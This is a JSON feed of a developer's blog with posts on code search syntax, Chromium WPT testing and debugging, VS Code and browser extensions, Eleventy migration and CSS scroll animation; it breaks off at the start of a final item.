{
	"version": "https://jsonfeed.org/version/1.1",
	"title": "deletethis.net",
	"language": "en",
	"home_page_url": "https://deletethis.net/dave/",
	"feed_url": "https://deletethis.net/feed/feed.json",
	"description": "Dave Risney&#39;s blog on web, coding, and things",
	"author": {
		"name": "Dave Risney",
		"url": "https://deletethis.net/dave/"
	},
	"items": [
		{
			"id": "https://deletethis.net/dave/2025-08/code-search-comparison--github--azure-devops--and-chromium/",
			"url": "https://deletethis.net/dave/2025-08/code-search-comparison--github--azure-devops--and-chromium/",
			"title": "Code Search Comparison: GitHub, Azure DevOps, and Chromium",
			"content_html": "<p>Before working in Chromium I had been using our internal project's Azure DevOps (ADO) code search feature, and occassionally using Chromium Code Search or GitHub's code search. It seemed like Chromium Code Search or GitHub code search would only sometimes work with my queries. Sitting down to compare the syntax of them led me to figure out why and the power of Chromium Code Search:</p>\n<h2 id=\"comparison-table\" tabindex=\"-1\">Comparison Table <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-08/code-search-comparison--github--azure-devops--and-chromium/\">#</a></h2>\n<table>\n<thead>\n<tr>\n<th>Feature</th>\n<th>ADO</th>\n<th>Chromium</th>\n<th>GitHub</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Wildcard syntax</td>\n<td>Full glob match (<code>*</code>)</td>\n<td>Partial regex match (uses regular expressions, e.g. <code>.*</code>)</td>\n<td>Paths use partial glob, everything else is partial literal match, or partial regex with slashes</td>\n</tr>\n<tr>\n<td>Search for method/class definition/declaration</td>\n<td><code>Def:Name</code> / <code>decl:Name</code></td>\n<td><code>Class:Name</code> / <code>Func:Name</code></td>\n<td><code>Symbol:Name</code></td>\n</tr>\n<tr>\n<td>Negation logic operator</td>\n<td><code>NOT</code></td>\n<td><code>-</code></td>\n<td><code>NOT</code></td>\n</tr>\n<tr>\n<td>Includes generated files</td>\n<td>❌</td>\n<td>✅</td>\n<td>❌</td>\n</tr>\n<tr>\n<td>Documentation</td>\n<td><a href=\"https://learn.microsoft.com/en-us/azure/devops/repos/git/code-search?view=azure-devops\">Functional code search - Azure Repos | Microsoft Learn</a></td>\n<td><a href=\"https://developers.google.com/code-search/reference/syntax\">Syntax reference | Code Search | Google for Developers</a></td>\n<td><a href=\"https://docs.github.com/en/search-github/github-code-search/understanding-github-code-search-syntax\">Understanding GitHub Code Search syntax</a></td>\n</tr>\n</tbody>\n</table>\n<p>The biggest difference is learning that Chromium is using partial regular expressions matching, ADO is using full glob matching, and GitHub is using partial literal matching unless you use <code>/.../</code> to explicitly ask for regular expressions. So <strong>TLDR</strong>: <code>*</code> in ADO should be <code>.*</code> in Chromium, and <code>/.*/</code> in GitHub.</p>\n<h3 id=\"example-comparison\" tabindex=\"-1\">Example Comparison <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-08/code-search-comparison--github--azure-devops--and-chromium/\">#</a></h3>\n<p>Searching for the <code>kTopLevel</code> symbol in the Chromium codebase, excluding tests and mojom files, and only looking in a service path:</p>\n<p><strong>ADO query:</strong></p>\n<pre><code>kTopLevel NOT path:*test* NOT ext:mojom path:*service*\n</code></pre>\n<p><strong><a href=\"https://source.chromium.org/search?q=%5CbkTopLevel%5Cb%20-path:test%20-path:%5C.mojom$%20-path:%5Eout%2F%20path:service&amp;sq=&amp;ss=chromium\">cs.chromium query</a>:</strong></p>\n<pre><code>\\bkTopLevel\\b -path:test -path:\\.mojom$ -path:^out/ path:service\n</code></pre>\n<p><strong><a href=\"https://github.com/search?q=repo%3Achromium%2Fchromium+%2F%5CbkTopLevel%5Cb%2F+NOT+path%3Atest+NOT+path%3A*.mojom+PATH%3Aservice&amp;type=code\">GitHub query</a>:</strong></p>\n<pre><code>repo:chromium/chromium /\\bkTopLevel\\b/ NOT path:test NOT path:*.mojom PATH:service\n</code></pre>\n<h3 id=\"notable-differences\" tabindex=\"-1\">Notable Differences: <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-08/code-search-comparison--github--azure-devops--and-chromium/\">#</a></h3>\n<h4 id=\"ktoplevel\" tabindex=\"-1\"><code>kTopLevel</code> <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-08/code-search-comparison--github--azure-devops--and-chromium/\">#</a></h4>\n<ul>\n<li><strong>ADO</strong>: <code>kTopLevel</code> matches just that word unless you use <code>*</code> to match more.</li>\n<li><strong>cs.chromium</strong>: <code>kTopLevel</code> is a regular expression that matches parts of words and you need to use <code>\\b</code> on the ends to indicate that it shouldn't match more.</li>\n<li><strong>GitHub</strong>: <code>kTopLevel</code> on its own does a partial literal match. If you want to match the whole word you can use a regular expression with <code>/.../</code> around it, so <code>/\\bkTopLevel\\b/</code>.</li>\n</ul>\n<h4 id=\"not-path-test\" tabindex=\"-1\"><code>NOT path:*test*</code> <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-08/code-search-comparison--github--azure-devops--and-chromium/\">#</a></h4>\n<ul>\n<li><strong>ADO</strong>: We use <code>NOT</code> for negation and to match any path with test we again have to use <code>*</code> to match more</li>\n<li><strong>cs.chromium</strong>: We negate with <code>–</code> and test is a regular expression that matches the text test anywhere in the path.</li>\n<li><strong>GitHub</strong>: We negate with <code>NOT</code> and test is a partial glob matches the text test anywhere in the path.</li>\n</ul>\n<h4 id=\"not-ext-mojom\" tabindex=\"-1\"><code>NOT ext:mojom</code> <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-08/code-search-comparison--github--azure-devops--and-chromium/\">#</a></h4>\n<ul>\n<li><strong>ADO</strong>: We can use <code>ext:</code> to match file extensions. It's just a shortcut for saying <code>path:*.mojom</code>.</li>\n<li><strong>cs.chromium</strong>: We need to represent this as a regular expression <code>-path:\\.mojom$</code>. In this case escape the <code>.</code> with <code>\\</code> so it's a literal <code>.</code> and use <code>$</code> to indicate that this is the end of the path.</li>\n<li><strong>GitHub</strong>: We can use <code>path:*.mojom</code> to match the file extension, although its a partial glob match so it would also match something like <code>my.mojom.txt</code> and is not perfect.</li>\n</ul>\n<h4 id=\"path-out\" tabindex=\"-1\"><code>-path:^out/</code> <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-08/code-search-comparison--github--azure-devops--and-chromium/\">#</a></h4>\n<ul>\n<li><strong>cs.chromium</strong>: They index generated files. Depending on what you're looking for this can be incredibly useful or since it indexes multiple different archs and platforms of generated code it can produce a lot of noise. You can use <code>-path:^out/</code> to ensure no generated files under the gen build folder show up.</li>\n</ul>\n",
			"date_published": "2025-08-06T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2025-07/watchbuildlog-vs-code-extension/",
			"url": "https://deletethis.net/dave/2025-07/watchbuildlog-vs-code-extension/",
			"title": "WatchBuildLog VS Code Extension",
			"content_html": "<p>I've made <a href=\"https://marketplace.visualstudio.com/items?itemName=DavidRisney.watchbuildlog\">WatchBuildLog</a>, a VS Code extension that watches a build log file and parses out build errors for the VS Code Problems tab. The default build log paths and build error patterns match the Chromium build system. But you can change the log paths and error patterns in the settings.</p>\n<p>There are other VS Code extensions for running the build from VS Code. But Chromium has so many different build targets and build options, that I want to continue building like I normally do from the command line. So rather than starting the build from VS Code, I stay in the command line unless there are errors I want to fix in VS Code, then I switch to VS Code, and the build errors are waiting for me.</p>\n<h2 id=\"development\" tabindex=\"-1\">Development <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-07/watchbuildlog-vs-code-extension/\">#</a></h2>\n<p>This is my first VS Code extension. I used GitHub Copilot in part of its creation and it was a reasonable experience. I did end up rewriting most of the code as the generated code was unnecessarily complicated and missed edge cases. But having never made a VS Code extension, before it was convenient to have Copilot help me get started and get the basic structure of the extension.</p>\n",
			"date_published": "2025-07-20T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2025-07/time-travel-debugging-wpt-on-windows/",
			"url": "https://deletethis.net/dave/2025-07/time-travel-debugging-wpt-on-windows/",
			"title": "Time Travel Debugging WPT on Windows",
			"content_html": "<p>I've had trouble getting Time Travel Debugging (TTD) working with debugging WPT from my chromium repo on Windows. Having finally gotten it working, I wanted to document the steps I took to get it working:</p>\n<ol>\n<li>\n<p>Follow the <a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-ttd-exe-command-line-util#how-to-download-and-install-the-ttdexe-command-line-utility-preferred-method\">install TTD instructions</a>. This will install the <code>Microsoft.TimeTravelDebugging</code> app package and will expose the <code>ttd.exe</code> command line executable.</p>\n</li>\n<li>\n<p>Disable hardware enforced stack protection. See <a href=\"https://learn.microsoft.com/en-us/windows-server/security/kernel-mode-hardware-stack-protection#enable-kernel-mode-hardware-enforced-stack-protection-in-windows-security\">Kernel-mode Hardware-enforced Stack Protection</a> of where to find the option, but disable it. TTD cannot trace an executable with this enabled.</p>\n</li>\n<li>\n<p>Add a WPT virtual test suite to pass in <code>--no-sandbox</code>. TTD doesn't work when Chromium sandboxing is on for a process. Edit <code>third_party/blink/web_tests/VirtualTestSuites</code> and add a new entry like the following:</p>\n</li>\n</ol>\n<pre><code>  {\n    &quot;prefix&quot;: &quot;no-sandbox&quot;,\n    &quot;platforms&quot;: [\n      &quot;Linux&quot;,\n      &quot;Mac&quot;,\n      &quot;Win&quot;\n    ],\n    &quot;bases&quot;: [ &quot;&quot; ],\n    &quot;args&quot;: [\n      &quot;--no-sandbox&quot;\n    ],\n    &quot;owners&quot;: [\n      &quot;example@example.com&quot;\n    ],\n    &quot;expires&quot;: &quot;Jul 17, 2026&quot;\n  },\n</code></pre>\n<ol start=\"4\">\n<li>Run TTD to monitor the WPT headless_shell.exe processes. In an admin prompt run the following, but modify the <code>-out</code> path to wherever you want the TTD trace files to be created. Pick a path that can store files of several GBs in size. Leave this running.</li>\n</ol>\n<pre><code>Admin&gt; ttd.exe -out C:\\users\\davris\\tmp -monitor headless_shell.exe -noUI\n</code></pre>\n<ol start=\"5\">\n<li>Run your WPT tests using the virtual test suite, with timeouts extended, and using a release build in a non-admin prompt. Note in the following command the test starts with the test suite prefix <code>virtual/no-sandbox/</code> and the <code>--timeout-multiplier</code> is set to 5 to allow for the much slower execution when TTD tracing.</li>\n</ol>\n<pre><code>Non-Admin&gt; Q:\\cr\\src\\third_party\\blink\\tools\\run_wpt_tests -t Q:\\cr\\src\\out\\release_x64 virtual/no-sandbox/external/wpt/service-workers/service-worker/service-worker-header.https.html --no-retry-failures --verbose --driver-logging --timeout-multiplier 5\n</code></pre>\n<ol start=\"6\">\n<li>Once the WPT finishes you should find a bunch of <code>*.run</code> files in the output directory you specified in step 4. These are the TTD trace files. You can open them in WinDbg and use <code>!peb</code> to see the command line and which kind of chromium process kind. But usually the <code>.run</code> file of the renderer process you want is the last one and largest one, and for the browser process is the first one.</li>\n</ol>\n",
			"date_published": "2025-07-17T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2025-07/opensourcein-browser-extension/",
			"url": "https://deletethis.net/dave/2025-07/opensourcein-browser-extension/",
			"title": "OpenSourceIn Browser Extension",
			"content_html": "<p>I've been writing (and using) a browser extension called <a href=\"https://github.com/david-risney/OpenSourceIn\">OpenSourceIn</a> that allows you to open the source code you're viewing in the browser into VS Code. It supports the web sites I use: GitHub, Azure DevOps, and the various Chromium development sites for bugs, code review, and source search. Working on Chromium I find myself very regularly switching between cs.chromium.org, issues.chromium.org, and chromium-review.googlesource.com and just wanted something to make it slightly easier to switch from the browser into the corresponding local source file. The best solution to this would be proper integration of these various sites into VS Code, but this provides good value for very little investment.</p>\n<h2 id=\"development\" tabindex=\"-1\">Development <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-07/opensourcein-browser-extension/\">#</a></h2>\n<p>I used GitHub Copilot throughout the development of this extension and overall I'm not sure if it saved me time but probably helped me actually finish. My overall thoughts:</p>\n<h3 id=\"side-project-fatigue-mitigation\" tabindex=\"-1\">Side project fatigue mitigation <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-07/opensourcein-browser-extension/\">#</a></h3>\n<p>I often get very interested and into a side project idea, but at this point in my life I can tell how many days I have before my focus and interest fails. GitHub Copilot helps me get through things like setting up the project, getting test infra setup, and so on that I might otherwise rathole on and not actually get to the project. It means I can start to see progress faster helping with my motivation.</p>\n<h3 id=\"creating-c-grade-skeleton\" tabindex=\"-1\">Creating C grade skeleton <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-07/opensourcein-browser-extension/\">#</a></h3>\n<p>Very similar to the above, the AI can help create a maybe C grade skeleton of the project. Its easier for me to work from this skeleton and fix things up then to start from scratch. I can run the skeleton and validate behavior as I go. I still end up rewriting maybe most of the code but I get to start with something that runs.</p>\n<p>And for this phase of the project where I am just trying to get it to setup a skeleton I don't have to invest a lot of my focus and time. When I start a build of another project that's going to take a few minutes I can run what I have, look through the code and tell it what I want to see and how to see things setup.</p>\n<p>When I first had it setup the project it included a bunch of popular dependencies that I really did not want. But its easy enough to go into the dependency list and remove these things and in the mean time I have a working project.</p>\n<h3 id=\"works-best-when-you-know-what-you-want\" tabindex=\"-1\">Works best when you know what you want <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-07/opensourcein-browser-extension/\">#</a></h3>\n<p>This was my first time trying to write a browser extension for a real purpose. I had a number of misconceptions about how browser extensions work. This led to several instances of me trying to get Copilot to write code that was not going to work. And talking to Copilot did not help. Its too much of a 'yes' person. I ask a question in a positive way and it gives me a positive answer. I rephrase my question in a negative way and it gives me a negative answer. I had to go read MDN on exactly how things actually work for browser extension developments.</p>\n<p>Similarly I can't tell it to do large tasks like fully describe the options page. I need to understand how I want the code structured, and go one by one through the features.</p>\n",
			"date_published": "2025-07-16T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/",
			"url": "https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/",
			"title": "Noobs WPT in Chromium learnings",
			"content_html": "<p>I'm happy to have finished <a href=\"https://chromium-review.googlesource.com/c/chromium/src/+/6322749\">my first Chromium bug that adds a WPT</a>.\nWriting a WPT I found to be more fun than writing usual C++ based tests. But I did learn\na bunch from issues I ran into and otherwise that I want to record here.</p>\n<h2 id=\"background\" tabindex=\"-1\">Background <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/\">#</a></h2>\n<p>The bug was <a href=\"https://issues.chromium.org/issues/40288240\">deferring registerProtocolHandler duriung prerendering</a>. You can see the <a href=\"https://storage.googleapis.com/spec-previews/WICG/nav-speculation/pull/283/diff/prerendering.html#extendedattrdef-delaywhileprerendering\">spec change</a> that led to opening this bug.</p>\n<p>The actual bug fix was pretty simple. The existing (un)registerProtocolHandler code is already split into validation in the renderer process before calling into the browser process for the actual registration work. The bug requires doing the validation synchronously and deferring the registration work so the existing code was already setup very nicely for this change.</p>\n<p>I found existing examples of deferring work (<a href=\"https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/modules/service_worker/service_worker_registration.cc?q=AddPostPrerenderingActivationStep&amp;ss=chromium\">service worker registration</a>, <a href=\"https://source.chromium.org/chromium/chromium/src/+/main:components/autofill/content/renderer/autofill_agent.cc?q=AddPostPrerenderingActivationStep&amp;ss=chromium\">AutofillAgent</a>) that shows using two functions to easily defer work:</p>\n<ul>\n<li>Check if we're prerendering using <a href=\"https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/modules/service_worker/service_worker_registration.cc?q=AddPostPrerenderingActivationStep&amp;ss=chromium\"><code>Document::IsPrerendering</code></a></li>\n<li>Defer work until after activation using <a href=\"https://source.chromium.org/search?q=AddPostPrerenderingActivationStep&amp;ss=chromium\"><code>Document::AddPostPrerenderingActivationStep</code></a></li>\n</ul>\n<h2 id=\"wpt-learnings\" tabindex=\"-1\">WPT learnings <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/\">#</a></h2>\n<p>Looking in WPT I could see existing tests for prerendering and for registerProtocolHandler so my plan for testing was to add WPTs. Specifically one to ensure validation occurs synchronously, that registration is deferred and unregistration is deferred. Working on this I learned a bunch of things from docs and from hitting and resolving issues. The rest of this is just my findings in no particular order.</p>\n<h3 id=\"wildcards\" tabindex=\"-1\">Wildcards <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/\">#</a></h3>\n<p>The <code>run_web_tests</code> / <code>run_wpt_tests</code> scripts don't let you use wildcards when specifying tests to run. But you can use a parameter that lets you specify tests that include a trailing wildcard. This encourages naming related tests with common prefixes. And you can do multiple rules separated by <code>::</code> (🤷)</p>\n<pre><code>Q:\\cr\\src\\third_party\\blink\\tools\\run_wpt_tests.bat -t Q:\\cr\\src\\out\\debug_x64  --isolated-script-test-filter external/wpt/html/browsers/history/the-location-interface/location-prototype*::external/wpt/html/browsers/history/the-location-interface/location-protocol*\n</code></pre>\n<h3 id=\"sync-ing-between-chromium-and-wpt\" tabindex=\"-1\">Sync'ing between chromium and WPT <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/\">#</a></h3>\n<p><a href=\"https://github.com/web-platform-tests/wpt\">WPT has a github repo</a> but chromium has a great system setup to do two way sync'ing between the chromium repo and the WPT repo with a bot. When you make a CL in chromium and its getting ready to submit a bot will open a github PR to push the change to the WPT repo. There's also a system to sync WPT repo changes back to chromium.</p>\n<p>So convenient!</p>\n<h3 id=\"manifest-update-30s\" tabindex=\"-1\">Manifest update 30s <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/\">#</a></h3>\n<p>When you call <code>run_w(eb|pt)_tests</code> by default it will parse the manifest JSON every time to collect a list of all tests and this takes about 30 seconds (for my machine). This is a pain, but if you haven't changed the list of tests then you skip this using the parameter <code>--no-manifest-update</code>.</p>\n<h3 id=\"virtual-test-folders\" tabindex=\"-1\">Virtual test folders <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/\">#</a></h3>\n<p>When referring to tests in <code>run_wpt_tests</code> you can refer to them by default using their path like <code>external/wpt/speculation-rules/prerender/protocol-handler-validation.html</code>. But some can be referred to exclusively by a <a href=\"https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/web_tests/VirtualTestSuites?q=speculation-rules-prerender-target-hint&amp;ss=chromium\">virtual test folder</a> in which case they have the virtual test folder prefix: <code>virtual/speculation-rules-prerender-target-hint/external/wpt/speculation-rules/prerender/protocol-handler-validation.html</code></p>\n<p>If a test is exclusive to a virtual test folder and you try to refer to it with the default name then <code>run_wpt_tests</code> says the test is skipped but won't say why. You may want to search <a href=\"https://luci-milo.appspot.com/ui/p/chromium/test-search?q=external%2Fwpt%2Fcontent-security-policy%2Fresource-hints%2Fprefetch-allowed-no-default.html\">LUCI tests</a> for a partial name of your test to find out its full and potentially virtual name.</p>\n<h3 id=\"wpt-name-suffix-https-html\" tabindex=\"-1\">WPT name suffix <code>.https.html</code> <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/\">#</a></h3>\n<p><a href=\"https://web-platform-tests.org/writing-tests/file-names.html\">WPT names</a> can have meaning from tags in the name. The big one for me is the <code>.https.html</code> tag which indicates the test must run using https. If you don't the test will run as http. I had trouble with this because when I went to debug the test its via <code>http://localhost</code> which although http it is localhost and chromium throws devs a bone and lets content run as if its via https. Accordingly it took me a bit to realize the issue was the test was running via http and so registerProtocolHandler just wasn't there.</p>\n<h3 id=\"testdriver-browser-extension-test-driver\" tabindex=\"-1\">Testdriver browser extension <code>test_driver</code> <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/\">#</a></h3>\n<p>Some WPT need to do things a browser shouldn't allow script to do normally for example skipping end user UI. For this purpose there's a <a href=\"https://web-platform-tests.org/writing-tests/testdriver-extension-tutorial.html\">Testdriver browser extension</a> which exposes APIs to script like <code>test_driver.set_rph_registration_mode('autoAccept');</code> (<a href=\"https://web-platform-tests.org/writing-tests/testdriver-extension-tutorial.html\">source</a>). This specifically will make <code>registerProtocolHandler</code> not show UI to the end user and auto accept instead. I was worried about not being able to test <code>registerProtocolHandler</code> in WPTs before finding out about this.</p>\n<p>Because WPT has to work in Firefox and Safari as well, adding to Testdriver may require significant effort to ensure it works in these browsers.</p>\n<h3 id=\"debugging\" tabindex=\"-1\">Debugging <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/\">#</a></h3>\n<p>My go to for debugging a WPT in the browser is via devtools. But if you're relying on the testdriver you won't be able to. I tried a few things:\n* Use <code>--enable-per-test-tracing</code> and (as long as your test isn't timing out) you'll get pftrace files created that you can open in about:tracing / <a href=\"https://ui.perfetto.dev/\">https://ui.perfetto.dev/</a>\n* Use <code>--driver-logging</code> / <code>--verbose</code> and the driver will log <code>console.log</code> messages to the console from any context (main test page, iframes, service workers)\n* Use <code> --additional-driver-flag=--enable-logging --additional-driver-flag=--v=1</code> with <code>--driver-logging</code> to turn on additional chromium logging. But just <code>--driver-logging</code> will get you chromium error logging of at least --v=3 (?).</p>\n<h3 id=\"content-shell\" tabindex=\"-1\">content_shell <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/\">#</a></h3>\n<p>You can run WPT using two scripts. <a href=\"https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/testing/run_web_platform_tests.md\"><code>run_wpt_tests</code></a> is the newer and preferred way to run tests using chrome or headless test driver.  Tests are getting ported over to running this way.</p>\n<p><a href=\"https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/testing/web_tests_in_content_shell.md#Running-WPT-Tests-in-Content-Shell\"><code>run_web_tests</code></a> is the older way that uses content_shell to run tests. You have to build content_shell specifically and it replaces some parts of the product like replacing the <code>Browser</code> class with the <code>Shell</code> class. This was a big problem for me because I didn't realize that register protocol handler's main registration code is in <code>Browser::RegisterProtocolHandler</code> and <code>Browser::UnregisterProtocolHandler</code>.  Running in content_shell instead I get <code>Shell::RegisterProtocolHandler</code> and <code>Shell::UnregisterProtocolHandler</code> but the unregister method is empty. I couldn't figure out why my test wasn't working until I added logging to the unregister methods and could see what was missing.</p>\n<h3 id=\"new-test-stability\" tabindex=\"-1\">New test stability <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/\">#</a></h3>\n<p>When adding a new test its important to ensure there's no reliability issues. You can locally rerun a test 20 times using something like <code>--repeat-each 20</code> and validate that it continues to work. When you submit the change via chromium CL it will see you are adding a new test and run it many times to ensure this as well.</p>\n<p>I had issues with my test sometimes failing but only on Mac. I hear that there are some reliabililty issues on specific Mac setups in the test lab and so I was recommended to allow for timeout from my tests on that group of Macs.</p>\n<h2 id=\"command-line-summary\" tabindex=\"-1\">Command line summary <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2025-03/noobs-wpt-in-chromium-learnings/\">#</a></h2>\n<p>run_wpt_tests:</p>\n<pre><code>Q:\\cr\\src\\third_party\\blink\\tools\\run_wpt_tests.bat -t Q:\\cr\\src\\out\\debug_x64  virtual/speculation-rules-prerender-target-hint/external/wpt/speculation-rules/prerender/protocol-handler-unregister.https.html --verbose --num-retries 0 --no-manifest-update -p chrome --repeat-each 20\n</code></pre>\n<p>run_web_tests:</p>\n<pre><code>Q:\\cr\\src\\third_party\\blink\\tools\\run_web_tests.bat -t Q:\\cr\\src\\out\\debug_x64  virtual/speculation-rules-prerender-target-hint/external/wpt/speculation-rules/prerender/protocol-handler-unregister.https.html --verbose --details --driver-logging --num-retries 0 --no-manifest-update --enable-per-test-tracing\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>run_web_tests param</th>\n<th>run_wpt_tests param</th>\n<th>notes</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>--driver-logging</code></td>\n<td><code>--verbose</code></td>\n<td>extra info and logging from tests and test infra. Includes chromium LOG statements</td>\n</tr>\n<tr>\n<td><code>--verbose --details</code></td>\n<td>n/a</td>\n<td>print extra info for every test result</td>\n</tr>\n<tr>\n<td><code>--num-retries 0</code></td>\n<td><code>--num-retries 0</code></td>\n<td>Don't retry failed tests</td>\n</tr>\n<tr>\n<td><code>--repeat-each 20</code></td>\n<td><code>--repeat-each 20</code></td>\n<td>Rerun every test 20 times</td>\n</tr>\n<tr>\n<td><code>--no-manifest-update</code></td>\n<td><code>--no-manifest-update</code></td>\n<td>Don't rebuild test list (30s)</td>\n</tr>\n<tr>\n<td><code>--enable-per-test-tracing</code></td>\n<td>n/a</td>\n<td>Generate pftrace files for the test run</td>\n</tr>\n</tbody>\n</table>\n",
			"date_published": "2025-03-20T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2025-02/eleventy-on-github-pages--part-3-/",
			"url": "https://deletethis.net/dave/2025-02/eleventy-on-github-pages--part-3-/",
			"title": "Eleventy on GitHub Pages (Part 3)",
			"content_html": "<p><a href=\"https://deletethis.net/dave/2025-02/eleventy-on-github-pages--part-3-/eleventy-github-pages-part-2.md\">Previously</a>, I made an Eleventy based GitHub project with GitHub automation to run Eleventy when checking in changes and hooked up a custom subdomain to the GitHub pages thinking I would start a new domain for the new blog. But I changed my mind again and now have my old URI pointing to the new blog:</p>\n<ol>\n<li>I made a <a href=\"https://github.com/david-risney/blog/blob/main/feed-to-md.ps1\">PowerShell script</a> to take my old blog's atom XML and turn them into post MD files for Eleventy. It was more difficult than I thought because my atom was not valid XML (eek). Rather than write code to fix it, it was easier to just edit the XML by hand to fix.</li>\n<li>I also customized my Eleventy URIs for blog posts to match my old blog's URIs. I added <a href=\"https://github.com/david-risney/blog/blob/main/content/dave/post/post.11tydata.js\">post.11tydata.js files</a> that setup the URI using custom JS functions. I define the functions in <a href=\"https://github.com/david-risney/blog/blob/main/eleventy.config.js\">eleventy.config.js</a> via <code>eleventyConfig.addFilter</code>.</li>\n<li>That covered most of the static blog content. For the rest I made a new subdomain to point to the old server and added a <a href=\"https://github.com/david-risney/blog/blob/main/content/404.md?plain=1\">custom 404 page</a> that can help redirect to the old server. <a href=\"https://docs.github.com/en/pages/getting-started-with-github-pages/creating-a-custom-404-page-for-your-github-pages-site\">GitHub Pages custom 404</a> are supported by putting a 404.html in the root path.</li>\n<li>I followed GitHub's directions for hooking up a top level domain name which was just to make A and AAAA records pointing to the GitHub IP addresses. It took a bit to populate but then worked great.</li>\n<li>I forgot to update the CNAME file. Doing a push reset my domain for my github pages back to the previous name which no longer points to anything and broke the site. I fixed the content in the CNAME file to address the issue.</li>\n</ol>\n<p>I'm going to call this transition complete! Its so much easier to work with Eleventy to add posts and not have to worry about server upgrades breaking things. For the new web content I've finished making a <a href=\"https://deletethis.net/dave/2025-02/eleventy-on-github-pages--part-3-/css-scroll-animated-sticky-header.md\">sticky scroll animated header</a> but still have thoughts for the future like a share button, and Mastodon based comments.</p>\n",
			"date_published": "2025-02-02T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2025-01/css-scroll-animated-sticky-header/",
			"url": "https://deletethis.net/dave/2025-01/css-scroll-animated-sticky-header/",
			"title": "CSS Scroll Animated Sticky Header",
			"content_html": "<p>I've made a sticky header that scroll animates all using CSS. I'm using the new <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/position?v=example#sticky\"><code>position: sticky</code></a> to make my <code>&lt;header&gt;</code> stick to the top of the page as the user scrolls down. Then I'm using <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_scroll-driven_animations\"><code>animation-timeline: scroll(root)</code></a> to animate the header and its content shorter when scrolling down the page.</p>\n<p>The big issue I ran into was a circular dependency: the header animates shorter based on the scroll position, and the header becoming shorter changes the document height and accordingly the scroll position. This resulted in strange jumping around while scrolling.</p>\n<p>To resolve it I'm adjusting the margin-bottom of the header so that the overall height including the margin remains the same.</p>\n<pre><code>  /* default size assuming scroll animation is not supported */\n  #floatyHeader {\n  \ttop: 0px;\n  \tposition: sticky;\n  \theight: 4em;\n  }\n\n  /* setup scroll animation */\n\t#floatyHeader {\n\t\tanimation: headerChange auto linear;\n\t\tanimation-timeline: scroll(root);\n\t}\n\n\t@keyframes headerChange {\n\t\t0% { \n\t\t\theight: 300px; \n\t\t\tmargin-bottom: 0px; \n\t\t}\n\t\t15% { \n\t\t\theight: 4em; \n      /* set the margin-bottom to the starting size minus the end size */\n\t\t\tmargin-bottom: calc(300px - 4em);\n\t\t}\n\t\t100% { \n\t\t\theight: 4em; \n\t\t\tmargin-bottom: calc(300px - 4em);\n\t\t}\n\t}\n</code></pre>\n<p>Here's an <a href=\"https://deletethis.net/dave/examples/sticky-scroll-animted-header.html\">example</a>.</p>\n",
			"date_published": "2025-01-02T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2024-05/eleventy-on-github-pages--part-2-/",
			"url": "https://deletethis.net/dave/2024-05/eleventy-on-github-pages--part-2-/",
			"title": "Eleventy on GitHub Pages (Part 2)",
